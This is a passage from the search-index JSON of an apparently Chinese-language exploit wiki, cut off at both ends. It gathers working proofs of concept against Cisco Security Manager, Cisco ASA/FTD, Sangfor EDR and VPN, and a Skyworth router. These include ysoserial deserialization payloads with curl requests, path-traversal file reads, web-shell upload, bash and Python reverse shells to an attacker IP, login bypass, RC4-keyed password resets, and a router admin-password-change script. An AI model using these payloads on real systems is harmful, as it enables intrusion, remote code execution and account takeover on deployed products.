POC"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#_1","text":"\u601d\u79d1\u5b89\u5168\u7ba1\u7406\u5668\u662f\u4e00\u4e2a\u4f01\u4e1a\u7ea7\u5b89\u5168\u7ba1\u7406\u5e94\u7528\u7a0b\u5e8f\uff0c\u53ef\u63d0\u4f9b\u5bf9\u601d\u79d1\u5b89\u5168\u548c\u7f51\u7edc\u8bbe\u5907\u7684\u4e86\u89e3\u548c\u63a7\u5236\u3002Cisco Security Manager\u5728\u5e7f\u6cdb\u7684Cisco\u5b89\u5168\u8bbe\u5907\u4e2d\u63d0\u4f9b\u5168\u9762\u7684\u5b89\u5168\u7ba1\u7406\uff08\u914d\u7f6e\u548c\u4e8b\u4ef6\u7ba1\u7406\uff09\uff0c\u5305\u62ecCisco ASA\u81ea\u9002\u5e94\u5b89\u5168\u8bbe\u5907\uff0cCisco IPS\u7cfb\u5217\u4f20\u611f\u5668\u8bbe\u5907\uff0cCisco\u96c6\u6210\u670d\u52a1\u8def\u7531\u5668\uff08ISR\uff09\uff0cCisco\u9632\u706b\u5899\u670d\u52a1\u6a21\u5757\uff08FWSM\uff09 \uff0cCisco Catalyst\uff0cCisco\u4ea4\u6362\u673a\u7b49\u7b49\u3002Cisco Security Manager\u5141\u8bb8\u60a8\u6709\u6548\u5730\u7ba1\u7406\u5404\u79cd\u89c4\u6a21\u7684\u7f51\u7edc-\u4ece\u5c0f\u578b\u7f51\u7edc\u5230\u5305\u542b\u6570\u767e\u53f0\u8bbe\u5907\u7684\u5927\u578b\u7f51\u7edc\u3002","title":"\u7b80\u4ecb"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#poc","text":"","title":"POC"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#secretservicejsp","text":"java -cp ./commons-beanutils-1.6.1.jar:[YOUR_PATH]]/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.GeneratePayload CommonsBeanutils1 \"cmd.exe /c calc.exe\" > payload_CommonsBeanutils curl -k --request POST --data-binary \"@payload_CommonsBeanutils\" https://[TARGET_HOST]/CSCOnm/servlet/SecretService.jsp","title":"SecretService.jsp  \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#csjaasserviceservlet","text":"Compile JaasEncryptor.java and replace the b64Payload content: import java.security.InvalidKeyException; import java.util.Base64; import com.cisco.nm.cmf.security.jaas.BlobCrypt; public class JaasEncryptor { public static void main(String args[]) { String b64Payload = \"rO0ABXN9AAAAAQAaamF2YS5ybWkucmVnaXN0cnkuUmVnaXN0cnl4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcgAtamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdEludm9jYXRpb25IYW5kbGVyAAAAAAAAAAICAAB4cgAcamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdNNhtJEMYTMeAwAAeHB3MQAKVW5pY2FzdFJlZgAIMTAuMC4wLjIAAAG7AAAAAEBnvkQAAAAAAAAAAAAAAAAAAAB4\"; byte[] payload = Base64.getDecoder().decode(b64Payload); byte[] key = new byte[]{-100, 76, -23, 87, 125, 0, 5, 94, 12, 76, 37, -84, 36, 78, 123, 5}; byte[] enc = BlobCrypt.encryptArray(payload, key); System.out.println(\"Encrypted payload: \" + Base64.getEncoder().encodeToString(enc)); byte[] dec = BlobCrypt.decryptArray(enc, key); } } Prepare JRMP Listener: java -cp [YOUR_PATH]/commons-beanutils-1.6.1.jar:[YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 443 java -jar [YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient '[YOUR_IP]]:443' | base64 -w0 Compile encrypted payload: javac -cp [YOUR_PATH]]/server_jars_classes/jars.jar:./ JaasEncryptor2.java; java -cp [YOUR_PATH]/server_jars_classes/jars.jar:./ JaasEncryptor Send payload to Servlet with parameters cmd=data + new line + data=[ENCRYPTED_PAYLOAD] .","title":"CsJaasServiceServlet \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#authtokenservlet","text":"Prepare JRMP Listener: java -cp [YOUR_PATH]/commons-beanutils-1.6.1.jar:[YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1337 CommonsBeanutils1 \"cmd.exe /c calc.exe\" java -jar [YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient '[YOUR_IP]]:1337' > payload_JRMP1_2 Send request: curl -k --request POST --data-binary \"@payload_JRMP1_2\" https://[TARGET_IP]/CSCOnm/servlet/com.cisco.nm.cmf.servlet.AuthTokenServlet","title":"AuthTokenServlet \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#clientservicesservlet","text":"Prepare JRMP listener: java -cp [YOUR_PATH]/commons-beanutils-1.6.1.jar:[YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1337 CommonsBeanutils1 \"cmd.exe /c calc.exe\" java -jar [YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient '[YOUR_IP]:1337' > payload_JRMP1_3 Send request: curl -k --request POST --data-binary \"@payload_JRMP1_3\" https://[TARGET_IP]/CSCOnm/servlet/com.cisco.nm.cmf.servlet.ClientServicesServlet","title":"ClientServicesServlet \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#ctmservlet","text":"java -cp ./commons-beanutils-1.6.1.jar:[YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.GeneratePayload CommonsBeanutils1 \"cmd.exe /c calc.exe\" > payload_CommonsBeanutils1_2 curl -i -s -k -X $'POST' -H $'Content-Type: application/octet-stream' -H $'CTM-URN: com-cisco-nm-vms-ipintel-IpIntelligenceApi' -H $'CTM-VERSION: 1.5' -H $'CTM-PRODUCT-ID: /C:/Program Files (x86)/CSCOpx/MDC/tomcat/vms/athena/WEB-INF/lib/' -H $'Cache-Control: no-cache' -H $'Pragma: no-cache' -H $'User-Agent: Java/1.8.0_222' -H $'Host: [TARGET_IP]' -H $'Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2' -H $'Connection: keep-alive' --data-binary \"@payload_CommonsBeanutils1_2\" $'https://[TARGET_IP]/athena/CTMServlet'","title":"CTMServlet \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#xdmconfigrequesthandler","text":"GET /athena/xdmProxy/xdmConfig[RELATIVE_PATH_TO_FILE]","title":"XdmConfigRequestHandler\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#xdmresourcerequesthandler","text":"GET /athena/xdmProxy/xdmResources[RELATIVE_PATH_TO_FILE]?dmTargetType=TARGET.IDS&dmOsVersion=7.&command=editConfigDelta","title":"XdmResourceRequestHandler \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#xmpfileuploadservlet","text":"Write a web shell e.g. POST /cwhp/XmpFileUploadServlet?maxFileSize=100 Normal multi-part e.g. writing web shell in filename with*../../MDC/tomcat/webapps/cwhp/testme.jsp*.","title":"XmpFileUploadServlet \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#xmpfiledownloadservlet","text":"GET /cwhp/XmpFileDownloadServlet?parameterName=downloadDoc&downloadDirectory=[RELATIVE_PATH_TO_DIRECTORY]&readmeText=1 This will respond with a ZIP file containing all files from the directory.","title":"XmpFileDownloadServlet \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#samplefiledownloadservlet","text":"GET /cwhp/SampleFileDownloadServlet?downloadZipFileName=pwned&downloadFiles=README&downloadLocation=[RELATIVE_PATH_TO_DIRECTORY] This will respond with a ZIP file containing all files from the directory.","title":"SampleFileDownloadServlet \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#resultsframejsp","text":"GET /athena/itf/resultsFrame.jsp?filename=[RELATIVE_PATH_TO_FILE]","title":"resultsFrame.jsp \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#secretserviceservlet","text":"See also https://de.tenable.com/security/research/tra-2017-23 java -cp [YOUR_PATH]/commons-beanutils-1.6.1.jar:[YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1337 CommonsBeanutils1 \"cmd.exe /c calc.exe\" java -jar [YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient '[YOUR_IP]:1337' > payload_JRMP1_2 curl -k --request POST --data-binary \"@payload_JRMP1_2\" https://[TARGET_IP]/CSCOnm/servlet/com.cisco.nm.cmf.servlet.SecretServiceServlet","title":"SecretServiceServlet \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#_2","text":"https://www.zdnet.com/article/cisco-reveals-this-critical-bug-in-cisco-security-manager-after-exploits-are-posted-patch-now/","title":"\u53c2\u8003"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-3452%EF%BC%9ACisco_ASAFTD%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/","text":"CVE-2020-3452\uff1aCisco_ASAFTD\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e POC For example to read \"/+CSCOE+/portal_inc.lua\" file. https://<domain>/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../ POC https://<domain>/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua","title":"CVE 2020 3452\uff1aCisco ASAFTD\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2020-hvv2/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 \u53d7\u5f71\u54cd\u7248\u672c\u4e3a3.2.17R1, 3.2.21\u4e24\u4e2a\u7248\u672c\uff0c\u5982\u679c\u4e3a\u8fd9\u4e24\u4e2a\u7248\u672c\u5efa\u8bae\u5347\u7ea7\u7248\u672c\u81f3 3.2.21.375 \u6f0f\u6d1e\u539f\u7406 \u00b6 POC POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9 HTTP/1.1 Host: xx.x.x.x Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.22.0 Content-Length: 77 {\"params\": \"w=123\\\"'1234123'\\\"|bash -i > & /dev/tcp/ip/port 0> & 1\"}","title":"\u6df1\u4fe1\u670dEDR \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c-2020-hvv2"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2020-hvv2/#_1","text":"\u53d7\u5f71\u54cd\u7248\u672c\u4e3a3.2.17R1, 3.2.21\u4e24\u4e2a\u7248\u672c\uff0c\u5982\u679c\u4e3a\u8fd9\u4e24\u4e2a\u7248\u672c\u5efa\u8bae\u5347\u7ea7\u7248\u672c\u81f3 3.2.21.375","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2020-hvv2/#_2","text":"POC POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9 HTTP/1.1 Host: xx.x.x.x Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.22.0 Content-Length: 77 {\"params\": \"w=123\\\"'1234123'\\\"|bash -i > & /dev/tcp/ip/port 0> & 1\"}","title":"\u6f0f\u6d1e\u539f\u7406"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 EDR 3.2.16\u30013.2.17\u30013.2.19 \u6f0f\u6d1ePOC \u00b6 \u53c2\u6570host/path/row/limit=\u547d\u4ee4 \u5373\u53ef\u6267\u884c\u547d\u4ee4 https://*****/tool/log/c.php?strip_slashes=system&host=id https://*****/tool/log/c.php?strip_slashes=system&path=id https://*****/tool/log/c.php?strip_slashes=system&row=id https://*****/tool/log/c.php?strip_slashes=system&limit=id #\u8d8a\u6743\u767b\u5f55 https://ip:xx/ui/login.php?user = admin #(\u7528\u6237\u540d\u5fc5\u987b\u5b58\u5728) #\u547d\u4ee4\u6267\u884c https://xx.xx.xx.37/tool/log/c.php?strip_slashes = system & host = id https://xx.xx.xx.37/tool/log/c.php?strip_slashes = system & host = whoami #\u53cd\u5f39shell https://xx.xx.xx.37/tool/log/c.php?strip_slashes = system & path = python -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('xx.xx.xx.105',1919));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\" 1.jpg 2.jpg 3.jpg","title":"\u6df1\u4fe1\u670dEDR\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"EDR 3.2.16\u30013.2.17\u30013.2.19","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","text":"\u53c2\u6570host/path/row/limit=\u547d\u4ee4 \u5373\u53ef\u6267\u884c\u547d\u4ee4 https://*****/tool/log/c.php?strip_slashes=system&host=id https://*****/tool/log/c.php?strip_slashes=system&path=id https://*****/tool/log/c.php?strip_slashes=system&row=id https://*****/tool/log/c.php?strip_slashes=system&limit=id #\u8d8a\u6743\u767b\u5f55 https://ip:xx/ui/login.php?user = admin #(\u7528\u6237\u540d\u5fc5\u987b\u5b58\u5728) #\u547d\u4ee4\u6267\u884c https://xx.xx.xx.37/tool/log/c.php?strip_slashes = system & host = id https://xx.xx.xx.37/tool/log/c.php?strip_slashes = system & host = whoami #\u53cd\u5f39shell https://xx.xx.xx.37/tool/log/c.php?strip_slashes = system & path = python -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('xx.xx.xx.105',1919));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\" 1.jpg 2.jpg 3.jpg","title":"\u6f0f\u6d1ePOC"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 EDR <=3.2.19 \u6f0f\u6d1ePOC \u00b6 user=\u4efb\u610f\u7528\u6237\u540d\u5373\u53ef\u767b\u5f55\uff08\u7528\u6237\u540d\u5b58\u5728\uff09\uff1a https://******/ui/login.php?user=admin","title":"\u6df1\u4fe1\u670dEDR\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#_1","text":"EDR <=3.2.19","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#poc","text":"user=\u4efb\u610f\u7528\u6237\u540d\u5373\u53ef\u767b\u5f55\uff08\u7528\u6237\u540d\u5b58\u5728\uff09\uff1a https://******/ui/login.php?user=admin","title":"\u6f0f\u6d1ePOC"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%BB%BB%E6%84%8F%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 M7.6.1 \u6f0f\u6d1ePOC \u00b6 https://127.0.0.1/por/changetelnum.csp?apiversion=1 POST\uff1a newtel=TARGET_PHONE & sessReq=clusterd & username=TARGET_USERNAME & grpid=0 & sessid=0 & ip=127.0.0.1","title":"\u6df1\u4fe1\u670dVPN\u4efb\u610f\u4fee\u6539\u7ed1\u5b9a\u624b\u673a"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%BB%BB%E6%84%8F%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/#_1","text":"M7.6.1","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%BB%BB%E6%84%8F%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/#poc","text":"https://127.0.0.1/por/changetelnum.csp?apiversion=1 POST\uff1a newtel=TARGET_PHONE & sessReq=clusterd & username=TARGET_USERNAME & grpid=0 & sessid=0 & ip=127.0.0.1","title":"\u6f0f\u6d1ePOC"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 \u5df2\u77e5M7.6.6R1 M7.6.1 \u5176\u4ed6\u7248\u672c\u6709\u5f85\u6d4b\u8bd5 \u6f0f\u6d1ePOC \u00b6 M7.6.6R1 key \u4e3a 20181118 M7.6.1 key \u4e3a 20100720``` https:// /por/changepwd.csp sessReq=clusterd&sessid=0&str=RC4_STR&len=RC4_STR_LEN `````` \u8ba1\u7b97RC4_STR_LEN\u811a\u672c from Crypto.Cipher import ARC4 from binascii import a2b_hex def myRC4(data,key): rc41 = ARC4.new(key) encrypted = rc41.encrypt(data) return encrypted.encode('hex') def rc4_decrpt_hex(data,key): rc41 = ARC4.new(key) return rc41.decrypt(a2b_hex(data)) key = '20100720' data = r',username=TARGET_USERNAME,ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=TARGET_PASSWORD,' print myRC4(data, key) ```","title":"\u6df1\u4fe1\u670dVPN\u4efb\u610f\u5bc6\u7801\u91cd\u7f6e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/#_1","text":"\u5df2\u77e5M7.6.6R1 M7.6.1 \u5176\u4ed6\u7248\u672c\u6709\u5f85\u6d4b\u8bd5","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/#poc","text":"M7.6.6R1 key \u4e3a 20181118 M7.6.1 key \u4e3a 20100720``` https:// /por/changepwd.csp sessReq=clusterd&sessid=0&str=RC4_STR&len=RC4_STR_LEN `````` \u8ba1\u7b97RC4_STR_LEN\u811a\u672c from Crypto.Cipher import ARC4 from binascii import a2b_hex def myRC4(data,key): rc41 = ARC4.new(key) encrypted = rc41.encrypt(data) return encrypted.encode('hex') def rc4_decrpt_hex(data,key): rc41 = ARC4.new(key) return rc41.decrypt(a2b_hex(data)) key = '20100720' data = r',username=TARGET_USERNAME,ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=TARGET_PASSWORD,' print myRC4(data, key) ```","title":"\u6f0f\u6d1ePOC"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E7%94%B5%E4%BF%A1/%E5%A4%A9%E7%BF%BC%E5%88%9B%E7%BB%B4awifi%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AD%98%E5%9C%A8%E5%A4%9A%E5%A4%84%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 \u5929\u7ffc\u521b\u7ef4awifi\u8def\u7531\u5668\u5b58\u5728\u591a\u5904\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e 2019-06-01 H4lo http://www.skyworth.com/ http://www.skyworth.com/ Boa/0.94.14rc21 CVE-2019-12862 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a \u00b6 #coding: utf-8 #__author__: H4lo import requests import sys payload = \"authflag=1\" UA = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36\" headers = { \"User-Agent\" : UA , \"Cookie\" : payload } def exp ( ip ): info = \"\"\"1. Login with no password \\n 2. Change administrator's password \\n \"\"\" print info op = int ( raw_input ( \"Enter the options:\" )) if op == 1 : url = \"http://\" + str ( ip ) + \"/home.htm\" try : res = requests . get ( url , headers = headers , timeout = 5 ) if \"title.htm\" in res . text : print \"[+] The router is vulnerable\" else : print \"[-] The router is not vulnerable\" except Exception as e : print str ( e ) elif ( op == 2 ): url = \"http://\" + str ( ip ) + \"/boafrm/formAwifiSwitchSetup\" data = { \"olduserpass\" : \"1\" , \"newpass\" : \"123456\" , \"confirmnewpass\" : \"123456\" , \"submit-url\" : \"/password.htm\" } try : res = requests . post ( url = url , headers = headers , data = data , timeout = 5 ) if \"restartNow\" in res . text : print \"[+] Password had be changed to 